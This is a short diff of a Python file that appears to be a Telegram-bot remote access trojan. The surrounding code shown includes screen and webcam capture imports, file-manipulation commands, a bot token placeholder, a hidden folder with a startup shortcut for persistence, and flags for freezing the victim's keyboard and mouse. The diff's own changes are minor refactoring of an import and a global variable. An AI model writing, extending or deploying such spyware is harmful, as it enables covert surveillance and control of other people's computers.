@@ -3,6 +3,7 @@
 import os, os.path, platform, ctypes
 os.environ["PBR_VERSION"]='5.0.0'
 import logging
+from consoleTools.consoleDisplay import log
 from PIL import ImageGrab 								# /capture_pc
 from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
 from sys import argv, path, stdout 						# console output
@@ -33,10 +34,6 @@ import urllib# wallpaper
 import cv2#webcam
 from ctypes import * #fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
-#For freezing the almighty mouse
-global mouseFrozen
-mouseFrozen = False
-
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 token = 'xx:xx' # you can set your environment variable as well
@@ -61,6 +58,8 @@ if not os.path.exists(hide_folder):
 	shortcut.Targetpath = hide_compiled
 	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
+
+global mouseFrozen
 destroy = False
 keyboardFrozen = False
 mouseFrozen = False
